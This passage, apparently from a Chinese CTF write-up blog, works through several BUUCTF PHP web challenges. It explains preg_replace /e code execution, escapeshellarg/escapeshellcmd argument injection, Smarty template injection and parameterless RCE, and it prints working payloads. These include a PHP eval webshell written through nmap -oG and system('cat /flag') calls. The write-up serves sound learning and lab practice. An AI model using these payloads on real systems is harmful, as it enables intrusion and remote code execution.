class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"find / -name "</span><span class="token operator">*</span>flag<span class="token operator">*</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cat /tmp/flagoefiu4r93'</span><span class="token punctuation">;</span>（挺无语的试出来的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单<br><code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code></p><hr><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p><a href="http://02d70d0c-b20c-4763-9f00-ddc3d9ba7b1a.node5.buuoj.cn:81/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php.........I">http://02d70d0c-b20c-4763-9f00-ddc3d9ba7b1a.node5.buuoj.cn:81/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php.........I</a> have a dream……<br><img src="https://pick.lwzheng.tech/2025/02/02/679f620a14e68.png" alt="154b514c66b309cfe4aae38adf72a224.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span><span class="token class-name type-declaration">php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=&gt;</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">#动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://">http://www.xinyueseo.com/websecurity/158.html</a><br><a href="https://www.cnblogs.com/Sentry-fei/p/15476811.html%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%80%E4%BA%9B%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95">https://www.cnblogs.com/Sentry-fei/p/15476811.html这里有一些本地测试</a><br><a href="https://">https://www.runoob.com/php/php-preg_replace.html</a></p><p><code>\1</code> 代表正则表达式中第一个捕获组所匹配到的内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果：字符串'11'</span><span class="token comment">#由于替换字符串是简单的 '1'，PHP 会尝试将其当作代码执行，但它并不是有效的 PHP 表达式。不过在这种情况下，preg_replace 的行为比较特殊，由于正则表达式匹配到整个字符串，并且替换字符串会被执行，最终的替换结果会出现两次 '1'，所以输出为 '11'</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ie'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'strtolower("\1")'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{${phpinfo()}}'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 结果：空字符串''</span><span class="token comment">#\1 代表第一个捕获组匹配的内容，也就是整个输入字符串 {${phpinfo()}}。strtolower 函数用于将字符串转换为小写。然而，当 phpinfo() 被执行时，它会输出大量的 PHP 配置信息到标准输出流，并且 strtolower 函数对 phpinfo() 的返回值（实际上 phpinfo() 返回值为 null）进行处理，最终导致整个替换操作的结果变得混乱。由于 phpinfo() 输出了内容，并且在这种执行逻辑下，最终返回给 preg_replace 的结果可能为空字符串，所以最终输出为 ''。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>\\</code> 会转义为单个 <code>\</code>，所以这里的 <code>\1</code> 代表正则表达式中第一个捕获组所匹配到的内容。</p><p>.* 整体的意思是匹配任意数量（包括零个）的任意字符。e 修饰符存在严重的安全隐患。因为它允许执行任意 PHP 代码<br>${phpinfo()} ：不执行<br> {${phpinfo()}}：执行</p><blockquote><ul><li><strong><code>.</code></strong>：在正则表达式中，点号（<code>.</code>）是一个元字符，它默认匹配除换行符之外的任意单个字符。例如，在字符串 <code>"abc"</code> 中，<code>.</code> 可以匹配 <code>a</code>、<code>b</code> 或者 <code>c</code> 中的任意一个字符。</li><li><strong><code>\S</code></strong>：这是一个预定义字符类，<code>\S</code> 表示匹配任意非空白字符。空白字符包括空格、制表符、换行符等，非空白字符就是除这些之外的字符，比如字母、数字、标点符号等。</li><li><strong><code>\*</code></strong>：这是一个量词，它表示前面的元素可以出现零次或多次。在 <code>\S*</code> 中，意味着非空白字符可以出现零个、一个或者多个连续的非空白字符。</li></ul></blockquote><!--strtolower("{${1}}") 又相当于 strtolower("{null}"), 又相当于 ``''` `空字符串。单纯地将整个字符串中的大写字母转换为小写。同样，对于 `"{null}"`，`strtolower` 也是对整个字符串进行处理。这两个字符串在 `strtolower` 函数的处理过程中，而它们本身都没有大写字母--><!--将.*改成\S*-->(在PHP中，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。)<p>动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span><span class="token operator">.</span>\<span class="token constant">S</span><span class="token operator">*</span><span class="token operator">.</span><span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#'.\S*.' 这个正则表达式整体的含义是匹配以任意一个非换行字符开始，接着是零个或多个非空白字符，最后再以任意一个非换行字符结束的字符串</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">=&gt;</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(.*)/ei'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'strtolower("${getFlag()}")'</span><span class="token punctuation">,</span> <span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">=&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'${getFlag()}'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>next.php?\S*=${getFlag()}&amp;cmd=system('cat /flag');</code></p><hr><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>[<a href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/#escapeshellarg">浅谈escapeshellarg逃逸与参数注入  Mi1k7ea ]http://www.mi1k7ea.com/2019/07/04/浅谈escapeshellarg与参数注入/#escapeshellarg</a></p><p><strong>escapeshellarg</strong></p><p>主要是为了防止用户的输入逃逸出“参数值”的位置，变成一个“参数选项”。</p><p>处理过程：如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p><p>场景功能：</p><blockquote><p>1.确保用户只传递一个参数给命令</p><p>2.用户不能指定更多的参数一个</p><p>3.用户不能执行不同的命令</p></blockquote><p><strong>escapeshellcmd</strong></p><p>主要是防止用户利用shell的一些技巧（如分号、管道符、反引号等）来进行命令注入攻击。</p><p>处理过程：如果输入内容中&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF等特殊字符会被反斜杠给转义掉；如果单引号和双引号不是成对出现时，会被转义掉。</p><p>场景功能：</p><blockquote><p>1.确保用户只执行一个命令</p><p>2.用户可以指定不限数量的参数</p><p>3.用户不能执行不同的命令</p></blockquote><p>通过参数注入向参数选项注入<a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">谈escapeshellarg绕过与参数注入漏洞 | 离别歌</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php<span class="token function">system</span><span class="token punctuation">(</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls --ignore="</span><span class="token operator">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" /tmp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//echo escapeshellcmd("ls --ignore=".escapeshellarg($_GET[c])." /tmp");</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token comment">//初始输入</span>alan<span class="token string single-quoted-string">' -l+//经过escapeshellarg()处理'</span>alan<span class="token string single-quoted-string">'\''</span> <span class="token operator">-</span>l<span class="token operator">+</span><span class="token string single-quoted-string">'//拼接命令ls --ignore='</span>alan<span class="token string single-quoted-string">'\''</span> <span class="token operator">-</span>l<span class="token operator">+</span><span class="token string single-quoted-string">' /tmp//经过escapeshellcmd()处理，即上图的输出结果ls --ignore=\'alan\'\\\'\' -l+ /tmpls --ignore='</span>alan<span class="token string single-quoted-string">'\\'</span><span class="token string single-quoted-string">' -l+\' /tmp//输出结果简化，等同于ls --ignore=alan\ -l '</span> <span class="token operator">/</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>当用户输入包含单引号时，先用escapeshellarg()处理会给该单引号添加转义符，再用escapeshellcmd()处理时会将该添加的转义符再添加一个转义符，从而导致单引号被逃逸掉，从而造成参数注入漏洞的存在；</strong></p></li><li><p>如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞；</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#（可以加点东西</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><code>-oG</code> 参数用于将 <code>nmap</code> 的扫描结果以 Grepable 格式输出到指定的文件中。</p><pre class="line-numbers language-none"><code class="language-none">nmap -oG &lt;output_file&gt; [其他扫描参数] &lt;目标主机或网络&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>&lt;output_file&gt;</code>：这是指定的输出文件名，扫描结果会被保存到这个文件中。</li><li><code>[其他扫描参数]</code>：可以包含 <code>nmap</code> 的各种扫描选项，例如 <code>-sT</code>（TCP 连接扫描）、<code>-F</code>（快速扫描，只扫描常见的 100 个端口）等。</li><li><code>&lt;目标主机或网络&gt;</code>：可以是单个 IP 地址、IP 地址范围或者域名等。</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string single-quoted-string">' 《?php @eval($_POST["pass"]);?&gt; -oG pass.php '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://122b544d-074b-44b4-8d5d-131449927350.node5.buuoj.cn/e6305cd14dbe6e1fc4041d81cb3fc9ee/pass.php">122b544d-074b-44b4-8d5d-131449927350.node5.buuoj.cn/e6305cd14dbe6e1fc4041d81cb3fc9ee/pass.php</a></p><p>[BUUCTF 2018 Online Tool | Kid](<a href="https://nkcell.github.io/2019/09/10/BUUCTF">https://nkcell.github.io/2019/09/10/BUUCTF</a> 2018  Online Tool/)</p><p>不知是不是版本的问题，我按上方文章实验escapeshellarg()与escapeshellcmd()却达到不了想要的效果</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">《?php$host = "' <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG pass.php '";$host = escapeshellarg($host);echo $host;echo "\n";$host = escapeshellcmd($host);echo $host;" <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG pass.php "^" ^<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>^?php</span> <span class="token attr-name">phpinfo^(^)^;^?^</span><span class="token punctuation">&gt;</span></span> -oG pass.php ^"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有无一样的友友？</p><hr><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>嘶~，但我看了看我IP不是这个呀（</p><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: xaxaxaYour IP is : xaxaxa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><del>果然不靠谱（</del></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d2bfef660a8dbbc2293e833c8c858b89.png"></p><p>所以不是flask该咋办？</p><p><a href="https://xz.aliyun.com/news/14141">文章 - PHP中的模板注入漏洞刨析 - 先知社区</a></p><p>试了一下不是Twig,是Smarty（<code>{$smarty.version}</code>）</p><pre class="line-numbers language-none"><code class="language-none">{system('ls /')} {system('cat /flag')} flag{7dd4f5f5-a7dd-43f8-b966-4c180f72af17}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0aa3233bf98122217b8d372ac0a13cc2.png"></p><p>说实话给我看傻了，咋一堆git（</p><p>GitHack启动（<code>python2 GitHack.py http://9211086e-5637-4026-a306-d75d0b458824.node5.buuoj.cn:81/.git/</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">《<span class="token operator">?</span>php<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment">// echo $_GET['exp'];</span>                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token comment">//[a-z,_]+：</span><span class="token comment">//[ ] 为字符类，用于匹配方括号内指定的任意一个字符。</span><span class="token comment">//a-z 表示匹配所有小写字母。</span><span class="token comment">//,_ 表示匹配逗号 , 或下划线 _。</span><span class="token comment">//+ 是量词，意味着前面的字符类至少出现一次。综合起来，[a-z,_]+ 用于匹配由一个或多个小写字母、逗号或下划线组成的字符串，通常对应函数名。</span><span class="token comment">//\(`**：     - 由于括号在正则表达式中有特殊含义，所以使用反斜杠 `\` 进行转义，这里表示匹配左括号 `(`，用于标识函数调用的起始。`(?R)?`： - `(?R)` 是递归引用语法，它会递归地引用整个正则表达式本身。在这个情境下，用于匹配函数内部可能嵌套的函数调用。     - `?` 是量词，表示前面的元素（即递归引用部分）可以出现 0 次或 1 次，意味着函数调用可以嵌套，也可以不嵌套。  - **`\)：</span><span class="token comment">//同样使用反斜杠 \ 对右括号进行转义，用于匹配函数调用结束的右括号 )。</span> <span class="token comment">//(?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。</span>   <span class="token comment">// scandir()可以使用里面不含参数</span><span class="token comment">//scandir('1')不可以使用，里面含有参数1，无法被替换删除</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/2301_76690905/article/details/133808536#:~:text=%E7%9B%AE%E5%BD%95%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE%E7%89%B9%E5%BE%81%EF%BC%9A%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D%EF%BC%9A%E2%80%A6">无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客</a></p><p>文章有具体写</p><p>在大多数操作系统的文件系统里，点号（<code>.</code>）是一个特殊的路径表示，它代表当前工作目录。<code>scandir()</code> 函数会将其解释为当前工作目录，并对该目录进行扫描。 <code>.</code>表示当前目录本身，<code>..</code> 表示父目录。</p><p><a href="https://www.runoob.com/php/func-string-localeconv.html">PHP localeconv() 函数 | 菜鸟教程</a></p><p>localeconv():返回一个包含本地数字及货币格式信息的数组,该数组的第一项就是’.’(这也太巧了吧，一般也猜不到)</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e0593316e12840a8e64914fd4b01fc4a.png"></p><blockquote><p>scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）<br>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）<br>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西<br>getcwd() :取得当前工作目录<br>dirname():函数返回路径中的目录部分<br>array_flip() :交换数组中的键和值，成功时返回交换后的数组<br>array_rand() :从数组中随机取出一个或多个单元</p><p>array_reverse():将数组内容反转</p><p>strrev():用于反转给定字符串</p><p>getcwd()：获取当前工作目录路径</p><p>dirname() ：函数返回路径中的目录部分。<br>chdir() ：函数改变当前的目录。</p><p>eval()、assert()：命令执行</p><p>hightlight_file()、show_source()、readfile()：读取文件内容</p><p>end() ： 将内部指针指向数组中的最后一个元素，并输出<br>next() ：将内部指针指向数组中的下一个元素，并输出<br>prev() ：将内部指针指向数组中的上一个元素，并输出<br>reset() ： 将内部指针指向数组中的第一个元素，并输出<br>each() ： 返回当前元素的键名和键值，并将内部指针向前移动</p></blockquote><p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><hr><p>or用session_id .使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p><p> 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p><p>readfile(session_id(session_start()));</p><p><img 